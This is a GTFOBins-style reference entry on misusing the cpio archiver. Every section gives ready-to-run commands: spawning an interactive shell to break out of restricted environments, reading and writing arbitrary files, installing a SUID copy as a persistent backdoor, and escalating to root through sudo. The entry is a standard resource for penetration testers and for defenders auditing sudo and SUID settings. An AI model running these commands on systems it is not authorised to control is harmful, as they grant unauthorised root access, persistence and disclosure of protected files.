# GTFOBin: cpio

## Shell

It can be used to break out from restricted environments by spawning an interactive system shell.

```
echo '/bin/sh </dev/tty >/dev/tty' >localhost
cpio -o --rsh-command /bin/sh -F localhost:
```

## File write

It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.

Copies `$LFILE` to the `$LDIR` directory.

```
LFILE=file_to_write
LDIR=where_to_write
echo DATA >$LFILE
echo $LFILE | cpio -up $LDIR
```

## File read

It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.

The content of the file is printed to standard output, between the cpio archive format header and footer.

```
LFILE=file_to_read
echo "$LFILE" | cpio -o
```

The whole directory structure is copied to `$TF`.

```
LFILE=file_to_read
TF=$(mktemp -d)
echo "$LFILE" | cpio -dp $TF
cat "$TF/$LFILE"
```

## SUID

If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run `sh -p`, omit the `-p` argument on systems like Debian (<= Stretch) that allow the default `sh` shell to run with SUID privileges.

This example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.

The whole directory structure is copied to `$TF`.

```
sudo install -m =xs $(which cpio) .

LFILE=file_to_read
TF=$(mktemp -d)
echo "$LFILE" | ./cpio -R $UID -dp $TF
cat "$TF/$LFILE"
```

Copies `$LFILE` to the `$LDIR` directory.

```
sudo install -m =xs $(which cpio) .

LFILE=file_to_write
LDIR=where_to_write
echo DATA >$LFILE
echo $LFILE | ./cpio -R 0:0 -p $LDIR
```

## Sudo

If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.

```
echo '/bin/sh </dev/tty >/dev/tty' >localhost
sudo cpio -o --rsh-command /bin/sh -F localhost:
```

The whole directory structure is copied to `$TF`.

```
LFILE=file_to_read
TF=$(mktemp -d)
echo "$LFILE" | sudo cpio -R $UID -dp $TF
cat "$TF/$LFILE"
```

Copies `$LFILE` to the `$LDIR` directory.

```
LFILE=file_to_write
LDIR=where_to_write
echo DATA >$LFILE
echo $LFILE | sudo cpio -R 0:0 -p $LDIR
```